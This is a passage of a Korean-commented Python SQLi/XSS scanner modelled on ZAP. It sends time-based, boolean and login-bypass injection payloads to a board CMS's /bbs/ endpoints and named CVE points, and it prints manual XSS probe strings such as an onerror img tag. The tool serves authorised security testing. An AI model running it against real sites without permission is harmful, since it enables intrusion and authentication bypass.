    }


# ── HTTP 세션 ──────────────────────────────────────────────────────

def make_session() -> requests.Session:
    session = requests.Session()
    retry = Retry(total=2, backoff_factor=0.5, status_forcelist=[500, 502, 503])
    adapter = HTTPAdapter(max_retries=retry)
    session.mount("http://", adapter)
    session.mount("https://", adapter)
    session.headers.update({
        "User-Agent": "Mozilla/5.0 (Security-Research-Scanner/3.0)",
        "Accept-Language": "ko-KR,ko;q=0.9",
    })
    return session


# ── 요청 전송 ─────────────────────────────────────────────────────

def send(session: requests.Session, config: dict,
         inject_value: str, extra: dict,
         timeout: int) -> Optional[dict]:
    params = {**extra, config["param"]: inject_value}
    try:
        t0 = time.time()
        if config["method"] == "GET":
            r = session.get(config["url"], params=params, timeout=timeout)
        else:
            r = session.post(config["url"], data=params,
                             timeout=timeout, allow_redirects=True)
        elapsed = time.time() - t0
        return {
            "status":  r.status_code,
            "length":  len(r.content),
            "elapsed": elapsed,
            "text":    r.text,           # XSS 탐지용 원본 텍스트
            "textl":   r.text.lower(),   # SQLi 에러 탐지용 소문자
        }
    except requests.exceptions.Timeout:
        return {"status": 0, "length": 0, "elapsed": timeout,
                "text": "", "textl": "", "timeout": True}
    except Exception:
        return None


def has_mysql_error(textl: str) -> bool:
    return any(p in textl for p in MYSQL_ERRORS)


def has_xss_marker(text: str) -> Tuple[bool, str]:
    """
    응답 HTML에 XSS 마커가 HTML 인코딩 없이 존재하는지 확인.
    ZAP 방식: 단순 반사 확인 + HTML 인코딩 여부 검사
    """
    tl = text.lower()
    for marker in XSS_MARKERS:
        ml = marker.lower()
        idx = tl.find(ml)
        if idx == -1:
            continue
        # HTML 인코딩 여부 확인 (&lt; &gt; &quot; 로 변환됐으면 무효)
        surrounding = text[max(0, idx - 10): idx + len(marker) + 10]
        if "&lt;" in surrounding or "&gt;" in surrounding or "&quot;" in surrounding:
            continue
        return True, marker
    return False, ""


def has_csv_marker(text: str, content_type: str = "") -> Tuple[bool, str]:
    """
    CSV Injection 탐지.
    1) 응답 Content-Type이 CSV/Excel인지 확인
    2) 응답 본문에 formula 문자가 인코딩 없이 반사됐는지 확인
    """
    ct = content_type.lower()
    for csv_ct in CSV_CONTENT_TYPES:
        if csv_ct in ct:
            return True, f"csv_content_type: {ct}"

    tl = text.lower()
    for marker in CSV_MARKERS:
        if marker.lower() in tl:
            return True, f"csv_formula_reflected: '{marker}' found"
    return False, ""


def probe_xss_context(session, config: dict, timeout: int) -> str:
    """
    ZAP Eyecatcher 방식: 무해한 마커 전송 → 반사 위치(컨텍스트) 파악
    반환값: 'attr_value' | 'attr_href' | 'script' | 'body' | 'html_comment' | 'none' | 'unknown'
    """
    resp = send(session, config, EYECATCHER, config.get("inject_extra", {}), timeout)
    if not resp or not resp["text"]:
        return "unknown"

    text = resp["text"]
    idx  = text.find(EYECATCHER)
    if idx == -1:
        return "none"   # 마커가 응답에 없음 → 반사 안 됨 or 인코딩됨

    # 마커 앞 50자, 뒤 50자 컨텍스트 확인
    before = text[max(0, idx - 50): idx]
    after  = text[idx + len(EYECATCHER): idx + len(EYECATCHER) + 50]

    before_l = before.lower()

    # HTML 주석 내부
    if "<!--" in before and "-->" not in before:
        return "html_comment"

    # <script> 태그 내부
    if "<script" in before_l:
        # 아직 </script>가 안 나왔으면 script 컨텍스트
        script_open  = before_l.rfind("<script")
        script_close = before_l.rfind("</script")
        if script_open > script_close:
            return "script"

    # value="" 속성 내부
    if 'value="' in before or "value='" in before:
        return "attr_value"

    # href / src / action 속성 내부
    for attr in ['href="', "href='", 'src="', "src='", 'action="', "action='"]:
        if attr in before:
            return "attr_href"

    # 일반 태그 속성 내부 (따옴표로 감싸진 경우)
    last_dq = before.rfind('"')
    last_sq = before.rfind("'")
    last_gt = before.rfind(">")
    if max(last_dq, last_sq) > last_gt:
        return "attr_value"

    # HTML body 직접 반사
    return "body"


# ── 제어 기준 측정 ─────────────────────────────────────────────────

def measure_controls(session, config: dict,
                     timeout: int) -> Tuple[Optional[dict], Optional[dict], bool, str, float]:
    """
    제어 기준 측정 + ZAP 방식 baseline 응답시간 측정.
    반환: (ctrl_true_resp, ctrl_false_resp, boolean_possible, xss_context, baseline_time)
    baseline_time: 시간 지연 탐지 임계값 계산에 사용
                   ZAP 공식: elapsed >= baseline_time + SLEEP_DURATION - 0.2
    """
    if config["mode"] == "xss":
        # XSS 모드: eyecatcher로 반사 컨텍스트 먼저 파악
        ctx = probe_xss_context(session, config, timeout)
        hint = XSS_CONTEXT_HINT.get(ctx, "")
        print(f"  [EYECATCHER] 반사 컨텍스트: {ctx.upper()}  {hint}")
        return None, None, False, ctx, 0.2

    print(f"  [CTRL] TRUE  : {config['ctrl_true'][:60]}")
    print(f"  [CTRL] FALSE : {config['ctrl_false'][:60]}")

    ct = send(session, config, config["ctrl_true"],
              config.get("ctrl_extra", {}), timeout)
    cf = send(session, config, config["ctrl_false"],
              config.get("ctrl_extra", {}), timeout)

    if not ct or not cf:
        print("  [CTRL] 제어 요청 실패")
        return None, None, False, "", 0.2

    diff = abs(ct["length"] - cf["length"]) / max(cf["length"], 1)
    possible = diff >= CTRL_DIFF_MINIMUM

    # ZAP 방식: 두 제어 요청의 평균을 baseline으로 사용
    baseline_time = (ct["elapsed"] + cf["elapsed"]) / 2.0

    print(f"  [CTRL] TRUE  응답: {ct['length']:6d} bytes  t={ct['elapsed']:.2f}s")
    print(f"  [CTRL] FALSE 응답: {cf['length']:6d} bytes  t={cf['elapsed']:.2f}s")
    print(f"  [CTRL] Baseline  : {baseline_time:.2f}s  "
          f"→ Time 임계값: {baseline_time + SLEEP_DURATION - 0.2:.2f}s")

    if possible:
        print(f"  [CTRL] 차이 {diff:.1%} → Boolean 탐지 가능 ✓")
    else:
        print(f"  [CTRL] 차이 {diff:.1%} → Boolean 구분 불가 (Error/Time 탐지로 진행)")

    return ct, cf, possible, "", baseline_time


# ── 탐지 판정 ──────────────────────────────────────────────────────

def detect(record: dict, resp: dict,
           ctrl_true: Optional[dict], ctrl_false: Optional[dict],
           boolean_possible: bool,
           mode: str,
           sleep_threshold: float = SLEEP_THRESHOLD) -> Tuple[bool, str]:

    rtype = record["type"].upper()

    # ══ XSS 탐지 ════════════════════════════════════════════════
    if mode == "xss" or "XSS" in rtype:
        found, marker = has_xss_marker(resp["text"])
        if found:
            return True, f"xss_marker_unencoded: '{marker}' found in response"
        # HTML 인코딩 여부 추가 확인
        if "&lt;img" in resp["textl"] or "&lt;svg" in resp["textl"]:
            return False, "xss_encoded: payload HTML-encoded (filtered)"
        return False, "xss_not_reflected"

    # ══ 시간 지연 탐지 (ZAP 방식: baseline + SLEEP_DURATION - 0.2) ══
    if "TIME" in rtype or "SLEEP" in record["family"].lower():
        if resp.get("timeout") or resp["elapsed"] >= sleep_threshold:
            return True, (f"time_delay={resp['elapsed']:.2f}s "
                          f"(>= threshold {sleep_threshold:.2f}s)")
        return False, (f"no_delay (elapsed={resp['elapsed']:.2f}s, "
                       f"threshold={sleep_threshold:.2f}s)")

    # ══ 에러 문자열 탐지 ════════════════════════════════════════
    if has_mysql_error(resp["textl"]):
        matched = [p for p in MYSQL_ERRORS if p in resp["textl"]]
        return True, f"mysql_error: {matched[:2]}"

    # ══ 로그인 우회 탐지 ════════════════════════════════════════
    if mode == "sqli_login":
        # 로그인 성공 시: 응답 크기 차이 or 특정 문자열
        success_signs = ["로그아웃", "logout", "마이페이지", "mypage", "mb_name"]
        fail_signs    = ["로그인", "아이디", "비밀번호", "틀렸", "잘못"]
        tl = resp["textl"]
        if any(s in tl for s in success_signs):
            return True, "login_bypass: success page detected"
        if ctrl_true and ctrl_false:
            # ctrl_true(bypass 시도)보다 현재 응답이 성공 쪽에 가까우면
            pass
        return False, "login_failed_as_expected"

    # ══ Boolean 탐지 ════════════════════════════════════════════
    is_bool = any(t in rtype for t in
                  ("BOOLEAN", "TAUTOLOGY", "CONDITIONAL", "EXIST",
                   "FIELD", "ORDERBY", "STRING", "LOGIN"))
    if is_bool and boolean_possible and ctrl_true and ctrl_false:
        t_len = ctrl_true["length"]
        f_len = ctrl_false["length"]
        r_len = resp["length"]
        dist_true  = abs(r_len - t_len)
        dist_false = abs(r_len - f_len)
        ctrl_span  = abs(t_len - f_len)
        if dist_true < dist_false:
            signal = (dist_false - dist_true) / max(ctrl_span, 1)
            if signal >= BOOL_SIGNAL_MIN:
                return True, (
                    f"boolean_TRUE_condition: resp={r_len}, "
                    f"ctrl_true={t_len}, ctrl_false={f_len}, signal={signal:.1%}"
                )
        return False, f"boolean_FALSE_condition (resp={r_len})"

    return False, "no_signal"


# ── 포인트별 스캔 ─────────────────────────────────────────────────

def scan_point(session, point_name: str, payloads: dict,
               timeout: int, verbose: bool) -> List[dict]:

    config  = POINT_CONFIG[point_name]
    results = []
    mode    = config.get("mode", "sqli")

    print(f"\n{'='*60}")
    print(f"  Input Point : {point_name}")
    print(f"  URL         : {config['url']}")
    print(f"  Method      : {config['method']}  Param: {config['param']}")
    print(f"  Mode        : {mode.upper()}")
    print(f"{'='*60}")

    ctrl_true, ctrl_false, boolean_possible, xss_context, baseline_time = measure_controls(
        session, config, timeout)

    # ZAP 방식 동적 시간 임계값: baseline + SLEEP_DURATION - 0.2
    effective_sleep_threshold = baseline_time + SLEEP_DURATION - 0.2

    # XSS 모드: 컨텍스트 기반 특화 페이로드 앞에 삽입 (ZAP 방식)
    if mode == "xss" and xss_context not in ("none", "unknown", "n/a", ""):
        ctx_records = XSS_CONTEXT_PAYLOADS.get(xss_context, [])
        if ctx_records:
            print(f"\n  [CTX-PAYLOAD] {xss_context} 컨텍스트 특화 페이로드 {len(ctx_records)}개 추가")
            # 기존 payloads 앞에 컨텍스트 특화 페이로드를 우선 삽입
            payloads = {"ctx_" + xss_context: ctx_records, **payloads}

    # SQLi Blind 모드: BLIND_SQLI_PAYLOADS 자동 주입
    # (JSON 페이로드 파일에 없어도 ZAP 기반 페이로드로 스캔)
    if mode == "sqli" and point_name in BLIND_SQLI_PAYLOADS:
        blind_records = BLIND_SQLI_PAYLOADS[point_name]
        print(f"\n  [BLIND-PAYLOAD] ZAP Blind SQLi 페이로드 {len(blind_records)}개 자동 주입")
        payloads = {"blind_" + point_name: blind_records, **payloads}

    total_vuln   = 0
    total_tested = 0

    for vtype, records in payloads.items():
        if not records:
            continue

        print(f"\n  -- [{vtype}]  ({len(records)} payloads) --")

        for rec in records:
            total_tested += 1
            payload = rec["payload"]

            resp = send(session, config, payload,
                        config.get("inject_extra", {}), timeout)

            if resp is None:
                vulnerable, reason = False, "request_failed"
            else:
                vulnerable, reason = detect(
                    rec, resp, ctrl_true, ctrl_false,
                    boolean_possible, mode,
                    sleep_threshold=effective_sleep_threshold)

            # ── ZAP double-check: Time-based 오탐 방지 ────────────
            # Time delay 탐지 시 일반 요청으로 서버 상태 한번 더 확인
            if vulnerable and "time_delay" in reason:
                print(f"\n    [DOUBLE-CHECK] 지연 탐지 → 서버 상태 재확인 중...")
                chk = send(session, config,
                           config.get("ctrl_false", "test"),
                           config.get("ctrl_extra", {}), timeout)
                if chk and chk["elapsed"] >= SLEEP_THRESHOLD * 0.8:
                    # 일반 요청도 느리면 서버 과부하로 판단 → 스킵
                    vulnerable = False
                    reason = (f"time_doublecheck_fail: "
                              f"server_slow ({chk['elapsed']:.2f}s), "
                              f"not SQLi")
                    print(f"    [DOUBLE-CHECK] 서버 과부하 판단 → 스킵 ({chk['elapsed']:.2f}s)")
                else:
                    chk_t = chk["elapsed"] if chk else 0
                    print(f"    [DOUBLE-CHECK] 확인 완료 ✓ "
                          f"(정상 요청={chk_t:.2f}s → SQLi 확정)")

            if vulnerable:
                total_vuln += 1

            if verbose or vulnerable:
                flag = "*** VULN ***" if vulnerable else "    safe   "
                print(f"\n    [{flag}]  {payload[:70]}")
                print(f"             reason : {reason}")
                if resp:
                    print(f"             resp   : "
                          f"status={resp['status']} "
                          f"len={resp['length']} "
                          f"t={resp['elapsed']:.2f}s")
            else:
                print(".", end="", flush=True)

            results.append({
                "point":      point_name,
                "vuln_type":  vtype,
                "type":       rec["type"],
                "family":     rec["family"],
                "payload":    payload,
                "vulnerable": vulnerable,
                "reason":     reason,
                "mode":       mode,
                "response": {
                    "status":  resp["status"]  if resp else None,
                    "length":  resp["length"]  if resp else None,
                    "elapsed": round(resp["elapsed"], 3) if resp else None,
                } if resp else None,
                "xss_context": xss_context if mode == "xss" else None,
                "payload_source": point_name,
                "controls": {
                    "true_len":  ctrl_true["length"]  if ctrl_true  else None,
                    "false_len": ctrl_false["length"] if ctrl_false else None,
                    "boolean_possible": boolean_possible,
                },
            })

        if not verbose:
            print()

    print(f"\n  [SUMMARY] {point_name}: {total_vuln}/{total_tested} 탐지")
    return results


# ── targets.json 자동 변환 ────────────────────────────────────────

def build_points_from_targets(targets: List[dict]) -> Tuple[dict, dict]:
    """
    analyzer.py 출력(targets.json) → POINT_CONFIG 항목 + 페이로드 자동 생성

    반환값: (new_points, new_payloads)
      - new_points  : POINT_CONFIG에 merge할 딕셔너리
      - new_payloads: all_payloads에 merge할 딕셔너리
    """
    new_points: dict = {}
    new_payloads: dict = {}

    for t in targets:
        url    = t["action"]
        method = t["method"].upper()
        all_params = t["params"]
        injectable = [p for p in all_params if p.get("injectable")]

        for inj in injectable:
            param_name = inj["name"]

            # 같은 폼/URL의 나머지 파라미터 → inject_extra (기본값 유지)
            extra = {
                p["name"]: p.get("default_value", "")
                for p in all_params
                if p["name"] != param_name
            }
            ctrl_true  = inj.get("default_value") or "test"
            ctrl_false = "xzxzxz_nomatch_xyz999"
            base_key   = f"auto_{t['id']}_{param_name}"

            # SQLi 포인트
            sqli_key = f"{base_key}_sqli"
            new_points[sqli_key] = {
                "url":          url,
                "method":       method,
                "param":        param_name,
                "mode":         "sqli",
                "inject_extra": extra,
                "ctrl_true":    ctrl_true,
                "ctrl_false":   ctrl_false,
                "ctrl_extra":   extra,
            }
            new_payloads[sqli_key] = {"sqli_string": GENERIC_SQLI_PAYLOADS}

            # XSS 포인트 (GET만 — POST XSS는 Stored라 수동 확인 필요)
            if method == "GET":
                xss_key = f"{base_key}_xss"
                new_points[xss_key] = {
                    "url":          url,
                    "method":       method,
                    "param":        param_name,
                    "mode":         "xss",
                    "inject_extra": extra,
                    "ctrl_true":    ctrl_true,
                    "ctrl_false":   ctrl_false,
                    "ctrl_extra":   extra,
                }
                new_payloads[xss_key] = {"xss_search": GENERIC_XSS_PAYLOADS}

    return new_points, new_payloads


# ── Main ──────────────────────────────────────────────────────────

def main():
    global SLEEP_THRESHOLD
    parser = argparse.ArgumentParser(
        description="SQLi/XSS Scanner v3 — payloads_v2.json 기반")
    parser.add_argument("--payloads", default="results/payloads_v2.json")
    parser.add_argument("--out",      default="results/scan_results_v3.json")
    parser.add_argument("--timeout",  type=int,   default=12)
    parser.add_argument("--sleep-threshold", type=float,
                        dest="sleep_threshold", default=SLEEP_THRESHOLD)
    parser.add_argument("--verbose",  action="store_true")
    parser.add_argument("--point",    default=None,
                        help="특정 포인트만 (예: sqli_search_sfl)")
    parser.add_argument("--targets",  default=None,
                        help="targets.json 경로 (crawler.py → analyzer.py 출력)")
    parser.add_argument("--baseline", action="store_true",
                        help="baseline/ 페이로드 포함 (JSON 없어도 단독 실행 가능)")
    parser.add_argument("--baseline-strength", default="HIGH",
                        choices=["LOW", "MEDIUM", "HIGH", "INSANE"],
                        dest="baseline_strength",
                        help="baseline 강도 (기본: HIGH)")
    args = parser.parse_args()

    SLEEP_THRESHOLD = args.sleep_threshold

    try:
        with open(args.payloads, encoding="utf-8") as f:
            all_payloads: Dict = json.load(f)
    except FileNotFoundError:
        if not args.baseline:
            print(f"[ERROR] {args.payloads} 없음. generate_payloads.py 먼저 실행.")
            sys.exit(1)
        all_payloads = {}
        print(f"  [INFO] {args.payloads} 없음 → baseline 전용 모드")

    # baseline 페이로드 merge
    if args.baseline:
        baseline = _baseline_payloads(args.baseline_strength)
        for pt_key, bl_payloads in baseline.items():
            if pt_key in all_payloads:
                for vtype, plist in bl_payloads.items():
                    all_payloads[pt_key].setdefault(vtype, []).extend(plist)
            else:
                all_payloads[pt_key] = bl_payloads
        n_bl = sum(len(v) for pls in baseline.values() for v in pls.values())
        print(f"  [BASELINE] {len(baseline)}개 포인트 / {n_bl}개 페이로드 추가 (강도: {args.baseline_strength})")

    # targets.json 자동 로드 (crawler.py → analyzer.py 연동)
    if args.targets:
        try:
            with open(args.targets, encoding="utf-8") as f:
                targets_data = json.load(f)
            auto_points, auto_payloads = build_points_from_targets(targets_data)
            POINT_CONFIG.update(auto_points)
            all_payloads.update(auto_payloads)
            print(f"  [TARGETS] {args.targets} 로드 완료")
            print(f"            자동 생성 포인트: {len(auto_points)}개")
        except FileNotFoundError:
            print(f"[ERROR] {args.targets} 없음.")
            sys.exit(1)

    print(f"\n{'='*60}")
    print(f"  SQLi/XSS Scanner v3")
    print(f"  Target  : {TARGET_BASE}")
    print(f"  Payloads: {args.payloads}")
    print(f"  Timeout : {args.timeout}s  Sleep-threshold: {SLEEP_THRESHOLD}s")
    print(f"  Started : {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
    print(f"{'='*60}")

    # payloads_v2.json의 포인트명 → POINT_CONFIG 매핑
    # (페이로드 키와 scanner 키가 다를 수 있어서 매핑)
    PAYLOAD_TO_POINT = {
        "xss_wr_subject":        None,               # 수동 테스트 필요 (로그인 필요)
        "xss_wr_content":        None,               # 수동 테스트 필요 (로그인 필요)
        "xss_search_stx":        "xss_search_stx",
        "xss_qalist_stx":        "xss_qalist_stx",
        "xss_comment":           None,               # 수동 테스트 필요 (로그인 필요)
        "sqli_search_sfl":       "sqli_search_sfl",
        "sqli_search_sst":       "sqli_search_sst",
        "sqli_search_stx":       "sqli_search_stx",
        "sqli_login_mb_id":      "sqli_login_mb_id",
        "sqli_qalist_sfl":       "sqli_qalist_sfl",
        # CVE 전용 포인트
        "cve_18662_install_sqli": "cve_18662_install_sqli",
        "cve_18661_login_xss":    "cve_18661_login_xss",
        "cve_18663_move_xss":     "cve_18663_move_xss",
        # 전체 포인트 (payloads_full.json)
        "sqli_search_stx_fix":    "sqli_search_stx_fix",
        "sqli_faq_stx":           "sqli_faq_stx",
        "xss_faq_stx":            "xss_faq_stx",
        "xss_write_subject_bypass": None,   # 수동 (로그인 필요)
        "xss_write_content_bypass": None,   # 수동 (로그인 필요)
        "xss_board_stx":          "xss_board_stx",
        "sqli_board_stx":         "sqli_board_stx",
        "sqli_board_sfl":         "sqli_board_sfl",
        "sqli_board_sst":         "sqli_board_sst",
        "sqli_ajax_member":       "sqli_ajax_member",
        "xss_move_from_bo":       "xss_move_from_bo",
        "xss_move_wr_id":         "xss_move_wr_id",
        "xss_password_url":       "xss_password_url",
        "xss_profile_mb":         "xss_profile_mb",
        "sqli_profile_mb":        "sqli_profile_mb",
        "xss_register_name":      "xss_register_name",
        "open_redirect_login":    "open_redirect_login",
        # ZAP 발견 — Boolean Blind SQLi 추가
        "sqli_password_sod":      "sqli_password_sod",
        "sqli_password_sop":      "sqli_password_sop",
        "sqli_board_wr_id":       "sqli_board_wr_id",
        "sqli_qalist_blind":      "sqli_qalist_blind",
    }

    session  = make_session()
    all_res: List[dict] = []

    # 수동 테스트 항목 안내
    manual_points = [k for k, v in PAYLOAD_TO_POINT.items()
                     if v is None and k in all_payloads]
    if manual_points:
        print(f"\n  [INFO] 아래 포인트는 로그인 필요 → 수동 테스트:")
        for mp in manual_points:
            print(f"         - {mp}")

    # 자동 스캔 대상 결정
    if args.point:
        scan_keys = [args.point]
        # --point로 지정한 포인트가 BLIND_SQLI_PAYLOADS에 있으면 all_payloads에 빈 dict 추가
        if args.point in BLIND_SQLI_PAYLOADS and args.point not in all_payloads:
            all_payloads[args.point] = {}
    else:
        scan_keys = [k for k, v in PAYLOAD_TO_POINT.items()
                     if v is not None and k in all_payloads]

        # BLIND_SQLI_PAYLOADS 포인트는 JSON 페이로드 없어도 강제 포함
        # (BLIND_SQLI_PAYLOADS에서 ZAP 기반 페이로드를 scan_point()에서 자동 주입)
        for blind_key in BLIND_SQLI_PAYLOADS:
            if blind_key not in scan_keys and blind_key in POINT_CONFIG:
                print(f"  [BLIND] {blind_key} → ZAP Blind SQLi 자동 추가")
                scan_keys.append(blind_key)
                # all_payloads에 빈 dict 추가 (scan_point에서 BLIND_SQLI_PAYLOADS로 채워짐)
                if blind_key not in all_payloads:
                    all_payloads[blind_key] = {}

    for payload_key in scan_keys:
        point_key = PAYLOAD_TO_POINT.get(payload_key, payload_key)
        if point_key is None:
            print(f"\n  [SKIP] {payload_key} → 수동 테스트 필요")
            continue
        if point_key not in POINT_CONFIG:
            print(f"\n  [SKIP] {point_key} → POINT_CONFIG 없음")
            continue
        if payload_key not in all_payloads:
            print(f"\n  [SKIP] {payload_key} → 페이로드 없음")
            continue

        results = scan_point(
            session, point_key, all_payloads[payload_key],
            timeout=args.timeout, verbose=args.verbose)
        # 결과에 payload_key 추가
        for r in results:
            r["payload_source"] = payload_key
        all_res.extend(results)

    # 저장
    with open(args.out, "w", encoding="utf-8") as f:
        json.dump(all_res, f, ensure_ascii=False, indent=2)

    # 최종 요약
    total  = len(all_res)
    vulns  = [r for r in all_res if r["vulnerable"]]
    n_vuln = len(vulns)

    print(f"\n{'='*60}")
    print(f"  SCAN COMPLETE")
    print(f"  총 테스트  : {total}")
    print(f"  탐지 건수  : {n_vuln} ({n_vuln / max(total, 1) * 100:.1f}%)")
    print(f"  결과 저장  : {args.out}")
    print(f"{'='*60}")

    if vulns:
        print("\n  *** 확인된 취약점 ***\n")
        for r in vulns:
            print(f"  [{r['point']:20s}] [{r['type']:20s}] [{r['family']:25s}]")
            print(f"    payload : {r['payload'][:80]}")
            print(f"    reason  : {r['reason']}")
            if r["response"]:
                print(f"    resp    : status={r['response']['status']} "
                      f"len={r['response']['length']} "
                      f"t={r['response']['elapsed']}s")
            print()
    else:
        print("\n  취약점이 탐지되지 않았습니다.")
        print("\n  수동 테스트 항목 (브라우저에서 직접 확인):")
        print("  1. /bbs/write_update.php → wr_subject에 <img src=x onerror=alert(1)> 입력")
        print("  2. /bbs/write_update.php → wr_content에 <svg/onload=alert(1)> 입력")
        print("  3. /bbs/write_comment_update.php → 댓글에 http://x.com\" onmouseover=\"alert(1) 입력")

    print(f"\n  완료: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")


if __name__ == "__main__":
    main()
    try:
        from pause_on_exit import pause_if_enabled
        pause_if_enabled()
    except Exception:
        pass
